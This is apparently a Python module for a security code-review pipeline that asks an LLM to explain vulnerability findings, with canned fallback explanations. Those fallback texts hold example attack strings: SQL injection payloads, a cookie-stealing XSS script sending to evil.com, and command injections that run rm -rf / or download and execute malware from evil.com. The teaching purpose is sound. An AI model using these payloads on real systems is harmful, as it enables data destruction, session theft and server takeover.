"""
Explanation Agent — Generates developer-friendly explanations of vulnerabilities.

Includes risk impact, attack scenarios, and remediation context.
"""

from __future__ import annotations

import json
import logging

from app.llm.client import get_llm_client
from app.models.state import ReviewState

logger = logging.getLogger(__name__)

PROMPT_TEMPLATE = """You are a security educator explaining vulnerabilities to developers. For each security finding below, provide a clear, developer-friendly explanation.

For each finding, provide:
1. A plain-language explanation of the vulnerability
2. A realistic attack scenario
3. The potential business impact

SECURITY FINDINGS:
{security_findings}

FIX SUGGESTIONS:
{fix_suggestions}

Respond ONLY with a JSON array. Each item should have:
- "file": filename
- "vulnerability": type name
- "explanation": clear, developer-friendly explanation (2-3 sentences)
- "attack_scenario": how an attacker could exploit this
- "impact": potential business impact

Return an empty array [] if no findings to process.
"""


def explanation_agent(state: ReviewState) -> dict:
    """
    LangGraph node: Generates developer-friendly explanations.

    Reads: state["security_findings"], state["fix_suggestions"]
    Writes: state["explanations"]
    """
    security_findings = state.get("security_findings", [])
    fix_suggestions = state.get("fix_suggestions", [])

    if not security_findings:
        logger.info("Explanation Agent: No findings to explain")
        return {"explanations": []}

    llm = get_llm_client()
    prompt = PROMPT_TEMPLATE.format(
        security_findings=json.dumps(security_findings, indent=2),
        fix_suggestions=json.dumps(fix_suggestions, indent=2),
    )

    logger.info(f"Explanation Agent: Generating explanations for {len(security_findings)} findings")
    response = llm.invoke(prompt)

    try:
        content = response.content if hasattr(response, "content") else str(response)
        explanations = _parse_json_response(content)
        logger.info(f"Explanation Agent: Produced {len(explanations)} explanations")
    except Exception as e:
        logger.error(f"Explanation Agent: Failed to parse response: {e}")
        explanations = _fallback_explanations(security_findings)

    return {"explanations": explanations}


def _fallback_explanations(findings: list[dict]) -> list[dict]:
    """Generate fallback explanations based on vulnerability type."""
    explanation_map = {
        "sql injection": {
            "explanation": "SQL injection allows attackers to manipulate database queries by inserting malicious SQL code through user inputs. This occurs when user-provided data is directly concatenated into SQL statements without proper sanitization.",
            "attack_scenario": "An attacker could enter malicious input like `' OR '1'='1` to bypass authentication or `'; DROP TABLE users;--` to delete data.",
            "impact": "Data breach, unauthorized data access, data deletion, and potential full system compromise.",
        },
        "xss": {
            "explanation": "Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. When user input is rendered in HTML without sanitization, browsers execute the injected script as trusted code.",
            "attack_scenario": "An attacker inserts `<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>` to steal session tokens.",
            "impact": "Session hijacking, credential theft, defacement, and malware distribution.",
        },
        "hardcoded secret": {
            "explanation": "Hardcoded credentials in source code are exposed to anyone with access to the repository. Once discovered, these credentials provide unauthorized access to protected resources.",
            "attack_scenario": "A leaked API key in a public or internal repository allows attackers to access cloud services, databases, or third-party APIs at the organization's expense.",
            "impact": "Unauthorized access, data breaches, financial loss from abused API quotas, and regulatory compliance violations.",
        },
        "command injection": {
            "explanation": "Command injection allows attackers to execute arbitrary OS commands on the server by manipulating user inputs that are passed to system shell calls.",
            "attack_scenario": "An attacker inputs `; rm -rf /` or `| wget https://evil.com/malware -O /tmp/malware && chmod +x /tmp/malware && /tmp/malware` to execute arbitrary commands.",
            "impact": "Complete server compromise, data exfiltration, lateral movement within the network.",
        },
        "insecure deserialization": {
            "explanation": "Insecure deserialization occurs when untrusted data is used to reconstruct objects. Attackers can craft malicious serialized objects that execute arbitrary code during the deserialization process.",
            "attack_scenario": "An attacker sends a crafted pickle payload that executes os.system('reverse_shell') when deserialized.",
            "impact": "Remote code execution, server compromise, denial of service.",
        },
    }

    default = {
        "explanation": "This code pattern may introduce security vulnerabilities. Review the implementation against secure coding guidelines.",
        "attack_scenario": "Various attack vectors may be possible depending on the specific implementation.",
        "impact": "Potential security breach, data exposure, or service disruption.",
    }

    explanations = []
    for finding in findings:
        vuln = finding.get("vulnerability", "").lower()
        info = default.copy()
        for key, value in explanation_map.items():
            if key in vuln:
                info = value
                break

        explanations.append({
            "file": finding.get("file", "unknown"),
            "vulnerability": finding.get("vulnerability", "Unknown"),
            **info,
        })

    return explanations


def _parse_json_response(content: str) -> list[dict]:
    """Extract and parse JSON from LLM response."""
    content = content.strip()
    if content.startswith("```"):
        lines = content.split("\n")
        content = "\n".join(lines[1:-1]) if lines[-1].strip() == "```" else "\n".join(lines[1:])

    try:
        result = json.loads(content)
        if isinstance(result, dict) and "explanations" in result:
            return result["explanations"]
        return result if isinstance(result, list) else [result]
    except json.JSONDecodeError:
        start = content.find("[")
        end = content.rfind("]")
        if start != -1 and end != -1:
            try:
                return json.loads(content[start : end + 1])
            except json.JSONDecodeError:
                pass
        return []
